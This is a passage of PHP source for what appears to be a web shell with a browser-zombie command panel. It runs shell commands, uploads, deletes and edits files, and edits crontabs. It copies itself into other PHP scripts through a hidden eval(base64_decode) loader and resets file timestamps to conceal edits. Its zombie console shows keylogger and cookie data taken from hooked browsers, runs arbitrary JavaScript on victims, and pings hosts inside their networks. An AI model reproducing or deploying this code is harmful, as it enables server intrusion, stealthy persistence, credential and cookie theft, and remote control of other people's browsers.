          {
            switch ($type)
            {
              case SQL_POSTGRESQL :
                $this->vars[$type.'_port'] = '5432';
                break;

              case SQL_MYSQL :
                $this->vars[$type.'_port'] = '3306';
                break;

              case SQL_LDAP : 
                $this->vars[$type.'_port'] = 
                  (stripos ($this->vars[$type.'_server'],
                            'ldaps://') !== false) ? 636 : 389;
                break;
            }
          }

          $login = trim ($this->vars[$type.'_login']);
          if (strcasecmp ($login, 'anonymous') == 0)
          {
            $login = '';
            $this->vars[$type.'_password'] = '';
          }

          $name = $this->build_sql_name ($this->vars[$type.'_database'], 
                                   $this->vars[$type.'_server']);
          $p = array (
            'server' => trim ($this->vars[$type.'_server']),
            'port' => trim ($this->vars[$type.'_port']),
            'database' => trim ($this->vars[$type.'_database']),
            'login' => trim ($this->vars[$type.'_login']),
            'password' => trim ($this->vars[$type.'_password'])
          );
          if (strlen ($name) && 
              !in_array ($name, array_keys ($this->vars[$type.'s'])))
          {
            $this->vars[$type.'s'][$name] = $p;
            $this->vars['sql_current'] = $name;
            $this->save_sql ($name, $type);
          }
          break;

        case EDIT_SQL_LOAD:
          $type = $this->vars['sql_type'];
          $name = $this->vars[$type.'s_index'];
          $this->vars['display_type'] = SHELL_SQL_TYPE_SHELL;
          $this->load_sql ($type);
          $this->vars['sql_current'] = $name;
          break;
      
        case EDIT_SQL_DELETE:
          $type = $this->vars['sql_type'];
          $name = $this->vars[$type.'s_index'];
          unset ($this->vars[$type.'s'][$name]);
          $this->delete_sql ($name, $type);
          if ($this->vars['sql_current'] == $name)
          {
            $this->vars['sql_current'] = '';
            $this->vars['sql_type'] = '';
          }
          break;
      }

      if ($this->vars['command_current'] != '')
      {
        $this->vars['command_current'] = 
          $this->cmd_replace_aliases ($this->vars['command_current']);
        if (!in_array ($this->vars['command_current'], $this->vars['history']))
        {
          array_push ($this->vars['history'], $this->vars['command_current']);
        }
      }
      elseif ($this->vars['sql_command_current'] != '' && 
              $this->vars['ldap_rw'] != 'w')
      {
        if (!in_array ($this->vars['sql_command_current'], 
                       $this->vars['sql_history']))
        {
          array_push ($this->vars['sql_history'],
                      $this->vars['sql_command_current']);
        }
      }

      if ($this->vars['is_nav'] != 1 && $this->vars['action_type'] != '')
      {
        if (isset ($this->vars['choice']) && count ($this->vars['choice']))
      	{
          switch ($this->vars['action_type'])
      	  {
      	    case ACTION_MENU_DELETE:
      	      $this->vars['action_result'] = 
      	        $this->delete_files ($this->vars['choice']);
      	      break;

      	    case ACTION_MENU_DOWNLOAD:
      	      $this->vars['action_result'] =
      	        $this->download_files (
                  $this->vars['choice'],
                  is_file ($this->vars['dir_current']));
              break;

      	    case ACTION_MENU_SAVE:
      	      $this->vars['action_result'] =
      	        $this->save_file ($this->vars['choice'][0],
                                  $this->vars['file_content']);
              break;

      	    case ACTION_MENU_HOSTME:
      	      $this->vars['action_result'] =
      	        $this->host_me ($this->vars['choice'],
                                is_file ($this->vars['dir_current']));
              break;
          }
      	}
      	elseif ($this->vars['action_type'] == ACTION_MENU_ZOMBIE_EDIT)
        {
      	  $this->vars['action_result'] =
      	    $this->get_zombie_data_html ($this->vars['zombie_id']);
        }
      	elseif ($this->vars['action_type'] == ACTION_MENU_ZOMBIE_DELETE)
        {
          foreach (array ('kl', 'ck', 'cmd', 'ping') as $t)
          {
            $this->delete_zombie_data ($t);
          }
        }
        elseif (in_array ($this->vars['action_type'], array (
          ACTION_MENU_ZOMBIE_CK_RESET, ACTION_MENU_ZOMBIE_KL_RESET,
          ACTION_MENU_ZOMBIE_CC_RESET, ACTION_MENU_ZOMBIE_CMD_PING,
          ACTION_MENU_ZOMBIE_CMD_EXEC_JS
        )))
        {
          switch ($this->vars['action_type'])
          {
            case ACTION_MENU_ZOMBIE_CK_RESET:
              $this->delete_zombie_data ('ck');
              break;

            case ACTION_MENU_ZOMBIE_KL_RESET:
              $this->delete_zombie_data ('kl');
              break;

            case ACTION_MENU_ZOMBIE_CC_RESET:
              $this->delete_zombie_data ('ping');
              break;

            case ACTION_MENU_ZOMBIE_CMD_PING:
              if (!$this->vars['host_to_ping'])
              {
                $this->vars['host_to_ping'] = '127.0.0.1';
              }
              $cmd = "prs_z_ping('http://" . 
                     $this->vars['host_to_ping'] . "');";
              $this->write_cmd_for_zombie ($cmd, $this->vars['zombie_id']);
              break;

            case ACTION_MENU_ZOMBIE_CMD_EXEC_JS:
              $cmd = $this->vars['js_to_execute'] . ';';
              $this->write_cmd_for_zombie ($cmd, $this->vars['zombie_id']);
              break;
          }
          $this->vars['action_type'] = ACTION_MENU_ZOMBIE_EDIT;
          $this->action ();
        }
      	elseif ($this->vars['action_type'] == ACTION_MENU_CRONTAB_SAVE)
        {
      	  $this->vars['action_result'] = $this->save_crontab ();
        }
      	elseif ($this->vars['action_type'] == ACTION_MENU_CRONTAB_REMOVE)
        {
      	  $this->vars['action_result'] = $this->remove_crontab ();
        }
      	elseif ($this->vars['action_type'] == ACTION_MENU_BOOKMARK)
        {
          $value = trim ($this->vars['dir_current']);
          if (!empty ($value) && !in_array ($value, $this->vars['bookmarks']))
          {
            array_push ($this->vars['bookmarks'], $value);
          }
        }
      	elseif ($this->vars['action_type'] == ACTION_MENU_UPLOAD)
        {
      	  $this->vars['action_result'] = $this->upload_file (); 
        }
      	elseif ($this->vars['action_type'] == ACTION_MENU_MKDIR)
        {
      	  $this->vars['action_result'] = 
            $this->_mkdir ($this->vars['mkdir_name']);
        }
      }

      sort ($this->vars['profiles']);
      sort ($this->vars['envpath']);
      sort ($this->vars['bookmarks']);
      sort ($this->vars['history']);
      sort ($this->vars['sql_history']);
    }


    function delete_zombie_data ($t)
    {
      $f = $this->get_base_tmpdir()."/.z_{$t}_".$this->vars['zombie_id'];

      if (file_exists ($f))
      {
        unlink ($f);
      }
    }

    function get_action_result_html ()
    {
      if (!is_array ($this->vars['action_result']))
      {
        return;
      }

      $output = "
        <p>
        <table class=action_result>
        <caption>Result</caption>
        <tr class=header><th>Action</th><th>Message</th></tr>";
      $row_color = '';
      foreach ($this->vars['action_result'] as $k => $v)
      {
        $row_color = ($row_color == 'odd') ? 'odd' : 'even';
        $output .= "<tr class=$row_color><td class=label>" . 
          $this->htmlentities ($k)."</td><td class=value>". 
          $this->htmlentities ($v)."</td></tr>";
      }
      $output .= "</table>";

      return $output;
    }

    function _mkdir ($name)
    {
      if (!$name)
      {
        return '';
      }

      ob_start ();
      $n = $this->vars['dir_current'].'/'.$name;
      mkdir ($n);
      chmod ($n, 0777);
      $this->vars['command_current_output'] = 
        $this->fix_magic_quotes (ob_get_contents ());
      ob_end_clean ();

      $output = array (
        "Creating directory $name" => $this->vars['command_current_output']
      );

      return $output;
    } 

    function upload_file ()
    {
      if (empty ($_FILES['upload_file']['tmp_name']))
      {
        return;
      }

      $src = $_FILES["upload_file"]["tmp_name"];
      $dest = $this->vars['dir_current'].'/'.$_FILES["upload_file"]["name"];

      ob_start (); 
      move_uploaded_file ($src, $dest);
      $ret = ob_get_contents ();
      $output = array ("Uploading file to $dest" => $ret);
      ob_end_clean ();

      return $output;
    }

    // Check if needed command for download are ok on the system
    function normal_download_ok ()
    { 
      $needed_ok = 1; 
      foreach ($this->config['download']['needed'] as $needed)
      {
        if (!$this->check_shell_command ($needed))
        {
          $needed_ok = 0;
          break;
        }
      }

      return $needed_ok;
    }

    function host_me ($files)
    {
      $output = array ();
      $filename = $this->create_tmpfile (); 

      if (!$filename)
      {
        $output[$k] = "Problem writing file!";
        return $output;
      }

      $myself = base64_encode ($this->read_file ($_SERVER['SCRIPT_FILENAME']));

      if (!is_array ($files))
      {
        $files = array ($files);
      }

      $this->write_file (
        $filename,
        base64_encode ("\$prshi=fopen('". 
        $_SERVER['SCRIPT_FILENAME']."','w');".
        "fwrite(\$prshi, base64_decode('$myself'));".
        "fclose(\$prshi);"), 'w');

      foreach ($files as $f)
      {
        $k = "Hosting myself in $f";
        $output[$k] = '';

        if (!$this->is_php_script ($f))
        {
          $output[$k] = "Not a PHP script!";
          continue;
        }

        $host = $this->read_file ($f);

        if (strpos ($host, '$prshm=') !== false)
        {
          $output[$k] = "Already hosted here!";
        }
        else
        {
          $pos = strrpos ($host, '?>');

          if (!$this->write_file (
            $f, 
            substr ($host, 0, $pos - 1) . 
            "\n\$prshm=fopen('$filename','r');\$prsc='';" .
            "while(!feof(\$prshm)) \$prsc.=fgets(\$prshm);" .
            "eval(base64_decode(\$prsc));\n" .
            substr ($host, $pos - 1, strlen ($host) - ($pos - 1)), 'w'))
          {
            $output[$k] = "File could not be written!";
          }
        }
      }

      return $output;
    }

    function download_files ($files, $single = 0)
    {
      $dir = $this->create_tmpdir ();
      $dst = "$dir.".$this->config['download']['extension']; 
      $src = '';

      foreach ($files as $f)
      {
        $src .= "$f ";
      }

      if (!$single && $this->normal_download_ok ())
      {
        $cmd = sprintf ($this->config['download']['application'], 
          "$src 2> /dev/null ", "$dst 2> /dev/null");
        $this->execute_command_safe ($cmd);

        $this->send_file ($dst);
      }
      else
      {
        $this->send_file ($files[0], $this->read_file ($files[0]));
      }

      $this->rmdirr ($dir);

      exit (0);
    }

    function remove_crontab ()
    {
      return array (
        "Removing crontab" => $this->execute_command_safe ('crontab -r'));
    }

    function save_crontab ()
    {
      $this->vars['crontab_data'] = preg_replace ("/(\s*\r\s*\n\s*)+/", "\r\n",
                                                  $this->vars['crontab_data']);
      return array (
        "Saving crontab" => $this->execute_command_safe (
          'echo "'.str_replace('"', '\"', $this->vars['crontab_data']). 
          '" | crontab -'));
    }

    function save_file ($file, $content)
    {
      $arr = explode (',', $this->vars['file_current_rights']);
      $can_change_timestamp = $this->can_change_file_timestamp (
        $arr[0], $arr[1], $arr[2]);
      $preserve_date = ($can_change_timestamp &&
                        $this->php_function_enabled ('fileatime') &&
                        $this->php_function_enabled ('filemtime'));

      if ($preserve_date)
      {
        $date = date ('YmdHi.s', fileatime ($file));
        $cmd1 = "touch -a -t $date $file";
        $date = date ('YmdHi.s', filemtime ($file));
        $cmd2 = "touch -m -t $date $file";
      }

      $this->write_file ($file, $content, 'w');

      if ($preserve_date && 
          $this->execute_enabled () && 
          $this->check_shell_command ('touch'))
      {
        $this->execute_command_safe ($cmd1);
        $this->execute_command_safe ($cmd2);
      }
    }

    function get_mime_type ($filename)
    {
      $pos = 0;
      $ret = 'text/plain';

      if ($filename == '' || ($pos = strrpos ($filename, '.')) === false)
      {
        return $ret;
      }

      switch (strtolower (substr ($filename, $pos + 1)))
      {
        case 'gif': $ret = 'image/gif'; break;
        case 'jpeg':
        case 'jpg':
        case 'jpe': $ret = 'image/jpeg'; break;
        case 'pcx': $ret = 'image/pcx'; break;
        case 'png': $ret = 'image/png'; break;
        case 'svg':
        case 'svgz': $ret = 'image/svg+xml'; break;
        case 'tiff':
        case 'tif': $ret = 'image/tiff'; break;
        case 'ico': $ret = 'image/x-icon'; break;
        case 'bmp': $ret = 'image/x-ms-bmp'; break;
        case 'xpm': $ret = 'image/x-xpixmap'; break;
        case 'ogg': $ret = 'application/ogg'; break;
        case 'mp3': $ret = 'audio/mpeg'; break;
        case 'ai':
        case 'eps':
        case 'ps': $ret = 'application/postscript'; break;
        case 'dvi': $ret = 'application/x-dvi'; break;
        case 'pdf': $ret = 'application/pdf'; break;
        case 'css': $ret['mimeType'] = 'text/css'; break;
        case 'rss': $ret = 'application/rss+xml'; break;
        case 'html':
        case 'htm':
        case 'shtml': $ret = 'text/html'; break;
        case 'php':
        case 'php3':
        case 'php4':
        case 'phtml':
        case 'php5': $ret = 'application/x-httpd-php'; break;
        case 'js': $ret = 'text/javascript'; break;
        case 'zip': $ret = 'application/zip'; break;
        case 'x-gtar':
        case 'gtar':
        case 'tgz':
        case 'taz': $ret = 'application/x-gtar'; break;
        case 'tar': $ret = 'application/x-tar'; break;
        case 'swfl':
        case 'swf': $ret = 'application/x-shockwave-flash'; break;
      }

      return $ret;
    }

    function send_file ($file, $data = 0)
    {
      $size = 0;
      $mime_type = '';

      if (!$data)
      {
        if (!$this->php_function_enabled ('filesize') ||
            ($size = (int) filesize ($file)) <= 0)
        {
          $size = strlen ($this->read_file ($file));
        }

        $mime_type = $this->config['download']['mime-type'];
        $filename = 'prs_download.'.$this->config['download']['extension'];
      }
      else
      {
        $size = strlen ($data);
        $mime_type = $this->get_mime_type ($file);
        $filename = basename ($file);
      }

      header ("Content-Type: $mime_type");
      header ("Content-Length: $size");
      header ('Expires: ' . gmdate('D, d M Y H:i:s') . ' GMT');

      if (strpos ($_SERVER['HTTP_USER_AGENT'], 'MSIE') !== false)
      {
        header ('Content-Disposition: inline; filename="' . $filename . '"');
        header ('Cache-Control: must-revalidate, post-check=0, pre-check=0');
        header ('Pragma: public');
      }
      else
      {
        header ('Content-Disposition: attachment; filename="'.$filename.'"');
        header ('Pragma: no-cache');
      }

      if (!$data)
      {
        echo $this->fix_magic_quotes ($this->read_file ($file), 1);
        unlink ($file);
      }
      else
      {
        echo $data;
      }
    }

    function _rmdirr_opendir ($f) 
    {
      if (is_dir ($f) && ($h = opendir ($f)))
      {
        while (($item = readdir ($h)) !== false)
        {
          if ($item !=  '.' && $item != '..')
          {
            $this->_rmdirr_opendir ("$f/$item");
          }
        }

        closedir ($h);
        rmdir ($f);
      }
      else
      {
        unlink ($f);
      }
    }

    function _rmdirr_glob ($f) 
    {
      if (is_dir ($f) && ($d = glob ($f.'/{,.}*', GLOB_BRACE)))
      {
        foreach ($d as $item) 
        {
          if (substr ($item, -1) != '.')
          {
            $this->_rmdirr_glob ($item);
          }
        }

        rmdir ($f);
      }
      else
      {     
        unlink ($f);
      }
    }

    function rmdirr ($dir) 
    {
      if ($this->php_function_enabled ('opendir'))
      {
        $this->_rmdirr_opendir ($dir);
      }
      elseif ($this->php_function_enabled ('glob'))
      {
        $this->_rmdirr_glob ($dir);
      }
    }

    function delete_files ($files)
    {
      $output = array ();

      if (!is_array ($files))
      {
        $files = array ($files);
      }

      $this->save_user_inputs ();

      foreach ($files as $file)
      {
        ob_start ();
        $this->rmdirr ($file);
        $this->vars['command_current_output'] = 
          $this->fix_magic_quotes (ob_get_contents ());
        ob_end_clean ();

        $output["Deleting file $file"] = $this->vars['command_current_output'];
      }

      $this->restore_user_inputs ();

      if (!is_file ($this->vars['dir_current']) && 
          !is_dir ($this->vars['dir_current']))
      {
        $this->vars['dir_current'] = dirname ($this->vars['dir_current']);
      }

      return $output;
    }

    function save_user_inputs ()
    {
      $this->sav_vars = base64_encode (serialize ($this->vars));
    }

    function restore_user_inputs ()
    {
      $this->vars = unserialize (base64_decode ($this->sav_vars));
    }

    function reset_user_inputs ()
    {
      $this->vars['command_current'] = '';
      $this->vars['command_current_output'] = '';
      $this->vars['sql_command_current'] = '';
      $this->vars['sql_command_current_output'] = '';
    }

    function get_menu_html ()
    {
      if (!$this->vars['display_type'])
        $this->vars['display_type'] = SHELL_TYPE_FILE_BROWSER;

      $output = "<table class=menu><tr>";

      $i = 0;
      foreach ($this->config['main_menu'] as $m)
      {
        $have_smenu = (isset ($m['smenu']) && is_array ($m['smenu']));
        $smenu = ($i++).'_smenu';

        if (!empty ($m['value']))
        {
          $output .= sprintf ("
            <td><div class='menu' %s onMouseOut=\"%s%s\"
            onMouseOver=\"this.style.cursor = 'pointer';
            this.style.color='yellow';menu_show('$smenu')\"
            onclick=\"document.forms[0].display_type.value='%s'; 
            document.forms[0].action_requested.value=''; 
            document.forms[0].action_type.value=''; 
            document.forms[0].dir_current.value=''; _submit()\">%s</div>",
            (($this->vars['display_type'] == $m['value']) ? 
              ' style="color: yellow" ' : ''),
            (($have_smenu) ? "menu_hide_async('$smenu');" : ''),
            (($this->vars['display_type'] == $m['value']) ? 
              '' : "this.style.color='cornflowerblue'"),
            $m['value'],
            $m['label']
          );
        }
        else
        {
          $output .= sprintf ("
            <td><div class='menu' onMouseOut=\"%s\"
            onMouseOver=\"this.style.cursor = 'default';
            menu_show('$smenu')\">%s</div>",
            (($have_smenu) ? "menu_hide_async('$smenu');" : ''),
            $m['label']
          );
        }

        if ($have_smenu)
        {
          $output .= "
            <div id='$smenu' class='smenu'
            style=\"visibility: hidden;position: absolute;\" 
            onMouseOver=\"currentOver='$smenu';menu_show('$smenu');\"
            onMouseOut=\"currentOver=null;menu_hide('$smenu');\">";

          foreach ($m['smenu'] as $sm)
          {
            $output .= "
              <table><tr><td><input onclick=\"show_hide('" . $sm['value'] . 
              "', " . $sm['value'] . "_cb);\" type=checkbox name=" . 
              $sm['value'] . "_cb" . 
              (($this->get_show_hide ($sm['value']) == 'hidden') ? 
                '' : ' checked="checked"') . "></td>
              <td nowrap><a href=\"javascript:show_hide('" . $sm['value'] . 
              "', document.forms[0]." . $sm['value'] . "_cb);\">" . 
              $sm['label'] . "</a></td></tr></table>";
          }

          $output .= "</div>";
        }

        $output .= "</td>";
      }

      $output .= "</tr></table>";

      return $output;
    }

    function get_php_function_alert_html ($type = 'all')
    {
      $output = "
        Some common PHP functions are 
        <font color=red><b>not available</b></font>.
        <br>";
      $output .= ($type == 'all') ? 
        "This feature <b>has been disabled</b>." :
        "Some operations will <b>not be enabled</b> or will
         <b>certainly fail</b>.";

      return $output;
    }

    function get_safe_mode_alert_html ($type = 'all')
    {
      $output = "
        PHP <b>safe_mode</b> is <font color=red><b>activated</b></font>.
        <br>";
      $output .= ($type == 'all') ?
        "This feature <b>has been disabled</b>." :
        "Some operations will <b>not be enabled</b> or will 
         <b>certainly fail</b>.";

      return $output;
    }

    function display_remote_infos_html ()
    {
      $infos = array ();

      $this->save_user_inputs ();

      foreach ($this->config['rinfos'] as $k => $v)
      {
        $cmds = explode ('|', $v);

        foreach ($cmds as $cmd)
        {
          $this->reset_user_inputs ();
          $this->vars['command_current'] = $cmd;

          $this->command_current_execute ();

          if ($this->vars['command_current_output'] != '' &&
              strpos ($this->vars['command_current_output'], 'not found') === false &&
              strpos ($this->vars['command_current_output'], 'such file') === false)
          {
            $infos[$k] = $this->vars['command_current_output'];
            break;
          }
        }
      }

      $this->restore_user_inputs ();

      echo "
        <table class=remote_infos>
        <caption>Some remote information</caption>
        <tr class=header><th>Name</th><th>Value</th></tr>";
      foreach ($infos as $k => $v)
      {
        echo "<tr><td class=label>$k</td><td>";
      	$v = chop ($v);
      	if (strpos ($v, "\n") !== false)
      	{
          $infos1 = explode ("\n", $v);

          echo "<table>";
      	  foreach ($infos1 as $v1)
      	  {
      	    if (strpos ($v1, '=') !== false)
      	    {
      	      list ($k2, $v2) = explode ('=', $v1);
      	      echo "<tr><td class=label>$k2</td><td>$v2</td></tr>";
      	    }
      	    elseif ($v1)
            {
      	      echo "<tr><td>$v1</td></tr>";
            }
      	  }

      	  echo "</table>";
      	}
      	else
        {
      	  echo "$v</td>";
        }

        echo "</td></tr>";
      }

      echo "</table>";
    }

    function get_ldap_begin_js ()
    {
      return "
        <script type='text/javascript'>
        function ldap_action_w()
        {
          document.getElementById('ldap_section_1').style.display='block';
          document.getElementById('ldap_section_2').style.display='none';
          document.getElementById('ldap_section_3').style.display='block';
          document.getElementById('ldap_section_4').style.visibility='hidden';
        }
       function ldap_action_r()
       {
         document.getElementById('ldap_section_1').style.display='none';
         document.getElementById('ldap_section_2').style.display='block';
         document.getElementById('ldap_section_3').style.display='none';
         document.getElementById('ldap_section_4').style.visibility='visible';
       }
       </script>";
    }

    function get_ldap_end_js ()
    {
      return "
        <script type='text/javascript'>
          if (document.forms[0].ldap_rw_r.checked)
            ldap_action_r();
          else
            ldap_action_w();
        </script>
      ";
    }

    function get_browse_path ()
    {    
      $path = '';
      $output = '';
      $is_file = is_file ($this->vars['dir_current']);

      if (!$is_file &&
          !is_dir ($this->vars['dir_current']))
      {
        $this->vars['dir_current'] = $this->get_root_path ();
      }

      $this->vars['dir_current'] = realpath ($this->vars['dir_current']);

      if (!$is_file &&
          substr ($this->vars['dir_current'], -1) != '/')
      {
        $this->vars['dir_current'] .= '/';
      }

      $output = "<table width='90%' style='border:none;margin-left:auto;margin-right:auto'><tr><td align=left width='80%'>";
      $p = $this->vars['dir_current'];

      for ($i = 0; $i < strlen ($p); $i++)
      {
        if ($p{$i} != '/')
      	{
      	  $path .= $p{$i};
      	  $name .= $p{$i};
      	}
        else
      	{
          $output .= ($path) ?
            "<input type=button class=file_browser_path
             onclick=\"action_type.value='';dir_current.value='" . 
             addslashes ($this->htmlentities ($path)) . 
            "';_submit()\" value=\"" . $this->htmlentities ($name) . "\">" :
            "<input type=button class=file_browser_path
             onclick=\"action_type.value='';" .
            "dir_current.value='/';_submit()\" value=\"/\">";
          $path .= '/';
          $name = '';
        }
      }

      if (!is_file ($this->vars['dir_current']))
      {
        $output .= sprintf ("
          </td><td align=right width='20%%'>
          <table style='border:none'>
          <tr><td colspan=\"2\" align=\"center\">
          <table class=file_browser_legend><tr>
          <td width='2%%' class=rights_write>&nbsp;</td>
          <td>Write</td><td width='2%%' class=rights_read>&nbsp;</td>
          <td>Read</td><td width='2%%' class=rights_bad>&nbsp;</td>
          <td>Nothing</td></tr>
          </table>
          </td>
          </tr>
          <tr>
          <td nowrap align=left><input type=checkbox onclick=\"_submit()\"
          id=show_hidden_files name=show_hidden_files%s>&nbsp;
          <label for=show_hidden_files>Show hidden files</label><br>
          <input type=checkbox onclick=\"_submit()\" 
          id=show_files name=show_files%s>&nbsp;
          <label for=show_files>Show files</label></td>
          <td nowrap align=left><input type=checkbox onclick=\"_submit()\"
          id=show_directories name=show_directories%s>&nbsp;
          <label for=show_directories>Show directories</label><br>
          <input type=checkbox onclick=\"_submit()\"
          id=show_symlinks name=show_symlinks%s>&nbsp;
          <label for=show_symlinks>Show symlinks</label></td></tr>
          </table></td></tr></table><p>",
          ($this->vars['show_hidden_files']) ? ' CHECKED' : '',
          ($this->vars['show_files']) ? ' CHECKED' : '',
          ($this->vars['show_directories']) ? ' CHECKED' : '',
          ($this->vars['show_symlinks']) ? ' CHECKED' : '');
      }
      else
      {
        $output .= sprintf ("
          <input type=hidden name=show_hidden_files value='%s'>
          <input type=hidden name=show_files value='%s'>
          <input type=hidden name=show_directories value='%s'>
          <input type=hidden name=show_symlinks value='%s'>",
          ($this->vars['show_hidden_files']) ? '1' : '0',
          ($this->vars['show_files']) ? '1' : '0',
          ($this->vars['show_directories']) ? '1' : '0',
          ($this->vars['show_symlinks']) ? '1' : '0');
      }

      return array ($p, $output);
    }
  
    function get_file_data_from_line ($line)
    {
      $arr = preg_split ("/\s+/", $line, 9);

          // Not a valid data
      if (count ($arr) <= 3 ||
          // For the moment we do not manage devices
          $this->is_device ($arr[0]) || 
          // A problem with env PATH?
          !isset ($arr[5])
         )
      {
        return null;
      }

      // Fixed a problem with some 'ls' output and symlinks
      if (isset ($arr[8]) && $this->is_symlink ($arr[0]) &&
        preg_match ('/^\->/', $arr[8]))
      {
        $arr[7] = "$arr[7] $arr[8]";
        unset ($arr[8]);
      }

      $arr[6] = preg_replace ('/\.\d+$/', '', $arr[6]);

      return $arr;
    }

    function normalize_file_browser_options ()
    {
      if (!($this->vars['show_files'] . 
            $this->vars['show_hidden_files'] .
            $this->vars['show_symlinks'] .
            $this->vars['show_directories']))
      {
        $this->vars['show_hidden_files'] = 0;
        $this->vars['show_files'] = 1;
        $this->vars['show_symlinks'] = 1;
        $this->vars['show_directories'] = 1;
      }
    }

    function normalize_profile_name ()
    {
      $this->vars['profile_name'] =
        preg_replace ('/[=\,\s\013\014_]/', '', $this->vars['profile_name']);
    }

    function normalize_box_pos ($name)
    {
      if (!$this->vars[$name . '_box_x'] &&
          !$this->vars[$name . '_box_y'])
      {
        $this->vars[$name.'_box_x'] = POPUP_DEFAULT_X.'px';
        $this->vars[$name.'_box_y'] = POPUP_DEFAULT_Y.'px';
      }
    }

    function normalize_bookmarks ()
    {
      // Default bookmarks
      if (!count ($this->vars['bookmarks']))
      {
        $this->vars['bookmarks'] = array ($this->get_root_path ());
      }
    }

    function normalize_envpath ()
    {
      if (!count ($this->vars['envpath']))
      {
        $this->vars['envpath'] = array (
          '/bin',
          '/sbin',
          '/usr/bin',
          '/usr/sbin',
          '/usr/local/bin',
          '/usr/local/sbin',
          '/opt/bin',
          '/opt/sbin'
        );

        if (ini_get ('safe_mode') && ini_get ('safe_mode_exec_dir'))
        {
          $this->vars['envpath'][] = ini_get ('safe_mode_exec_dir');
        }
      }
    }

    function build_sql_name ($s1, $s2)
    {
      $s1 = preg_replace ('/[^a-z]/i', '', $s1);
      $s2 = preg_replace ('/[^a-z]/i', '', $s2);

      return "$s1@$s2";
    }

    function get_zombies_timers_html ($full = 0, $kl_file = '', $ck_file = '')
    {
      $output = "
        <div style='margin:auto;width:400px'>
        <p>Data displayed in this section are refreshed every ". 
        (AJAX_REFRESH_INTERVAL / 1000)." seconds...";

      $output .= '<ul>';
      if ($full)
      {
        $output .= "<li>Last user action&nbsp;: <span class=info_value>";

        $kl_ft = (file_exists ($kl_file)) ? filemtime ($kl_file) : '';
        $ck_ft = (file_exists ($ck_file)) ? filemtime ($ck_file) : '';

        if (!$kl_ft && !$ck_ft)
        {
          $output .= "Waiting for action...";
        }
        else
        {
          $last_action = date ('Y-m-d H:i:s',
                               ($kl_ft > $ck_ft) ? $kl_ft : $ck_ft);
          $output .= $last_action;
        }
      }

      $output .= "
        </span></li>
        <li>Last refresh (server time)&nbsp;: <span class=info_value>".
        date ('H:i:s')."</span></li></ul></div>";

      return $output;
    }

    function get_zombie_ping_result ($id)
    {
      $output = '';

      $file = $this->get_base_tmpdir().'/.z_ping_'.$id;

      if (!($data = $this->read_file ($file)))
      {
        return '';
      }

      foreach (array_reverse (explode ("\n", $data)) as $line)
      {
        $line = preg_replace ("/\n/", '', $line);
        if (!trim ($line))
        {
          continue;
        }

        $c = explode ('|~|', $line);
        $d = explode ('--', $c[1]);

        $output .=
          $c[0].' - '.$d[0].' -> '.(($d[1]) ? 'PONG!' : 'Timeout...')."\n";
      }

      return $output;
    }

    function build_kl_internal_message (&$arr, &$i, $msg)
    {
      $this->_build_kl_internal_message ($arr, $i, "\n[prs_message]->");
      $this->_build_kl_internal_message ($arr, $i, $msg);
      $this->_build_kl_internal_message ($arr, $i, "\n");
    }

    function _build_kl_internal_message (&$arr, &$i, $msg)
    {
      for ($j = 0; $j < strlen ($msg); $j++)
      {
        $arr[$i++] = $msg{$j};
      }
    }

    function get_zombie_data_html ($id)
    {
      $output = '';
      $tmpdir = $this->get_base_tmpdir ();
      $kl_file = "$tmpdir/.z_kl_$id";
      $ck_file = "$tmpdir/.z_ck_$id";

      if (!$this->is_ajax_request ())
      {
        $output .= "<div style='margin:auto;width:400px'>";

        $z_page = $this->get_zombie_location_by_name ($id);   
        $output .= "
          <h3>Data for zombie <span class=info_value>
          <a target=\"_BLANK\" style='color:cornflowerblue'
           href=\"$z_page\">$z_page</a></span></h3>";
      }

      if (!$this->is_ajax_request () ||
          $_POST['div'] == 'id_timer')
      {
        if (!$this->is_ajax_request ())
        {
          $output .= "<div id=id_timer style=\"display:block;\">";
        }

        $output .= $this->get_zombies_timers_html (1, $kl_file, $ck_file);

        if (!$this->is_ajax_request ())
        {
          $output .= "</div>";
        }
      }

      if (!$this->is_ajax_request ())
      {
        $output .= "
          <p align=center><input title=\"Ping zombie network and execute JS code on zombie\" class=page_menu type=button value=\"Control center\" 
          onclick=\"show_hide_page_menu('id_cc')\">&nbsp;
          <input title=\"View zombie user keyboard inputs\" class=page_menu type=button value=\"Keylogger\" 
          onclick=\"show_hide_page_menu('id_kl')\">&nbsp;
          <input title=\"View zombie cookies\" class=page_menu type=button value=\"Cookies\" 
          onclick=\"show_hide_page_menu('id_ck')\"></p>";

          $output .= "</div>";
      }

      // Control center
      if (!$this->is_ajax_request () ||
          $_POST['div'] == 'id_cc')
      {
        if (!$this->is_ajax_request ())
        {
          $output .= "<div id=id_cc style=\"display:none;\">";
        }

        $output .= "
          <table width=850><caption>Control center</caption>
          <tr><th colspan=2>Remote Network Test</th></tr>
          <tr><td>
          <input type=text name=host_to_ping value=\"" .
          (($this->vars['host_to_ping']) ? $this->vars['host_to_ping'] : '') . 
          "\">
          <input type=button onclick=\"show_msg('HTTP PING request sent to zombie');ajax_request(ajax,'ajax=z&zombie_id=" . $this->vars['zombie_id']. "&action_type=" . ACTION_MENU_ZOMBIE_CMD_PING . "&host_to_ping=' + escape(host_to_ping.value), '')\" title='Ping this host using zombie local network' value='Ping this host...'></td>
          <td width=55><input type=button onclick=\"show_msg('RESET request for PING console sent');ajax_request(ajax,'ajax=z&zombie_id=" . $this->vars['zombie_id']. "&action_type=" . ACTION_MENU_ZOMBIE_CC_RESET . "', '')\" title='Reset ping results' value='Reset'>
          </td></tr>
          <tr><td width=300><div id=id_cc_dyn>
          <textarea rows=17 cols=110>" .
          $this->get_zombie_ping_result ($this->vars['zombie_id']) . 
          "</textarea></div></td><td>&nbsp;</td></tr>
<tr><th colspan=2>Remote Javascript Control</th></tr>
<tr>
<td width=300><textarea rows=17 cols=110 name=js_to_execute></textarea></td>
<td height=10><input type=button onclick=\"js_to_execute.value=''\" title='Reset Javascript console' value='Reset'><p>
<input type=button onclick=\"eval(js_to_execute.value)\" title=\"Raw execution, using eval() function\" value='Local test'><p>
<input type=button title='Execute the given javascript code on zombie' onclick=\"if (js_to_execute.value) {show_msg('JAVASCRIPT sent to zombie');ajax_request(ajax,'ajax=z&zombie_id=" . $this->vars['zombie_id']. "&action_type=" . ACTION_MENU_ZOMBIE_CMD_EXEC_JS . "&js_to_execute=' + escape(js_to_execute.value), '')}\" value='Execute on zombie'></td></tr>
</table><div id=msg style=\"display: none;\"><div id=msg_text> </div><br><input type=button class=button onclick=\"close_msg()\" value=\"Close\"></div>";
  
          if (!$this->is_ajax_request ())
          {
            $output .= "</div>";
          }
      }
      elseif ($_POST['div'] == 'id_cc_dyn')
      {
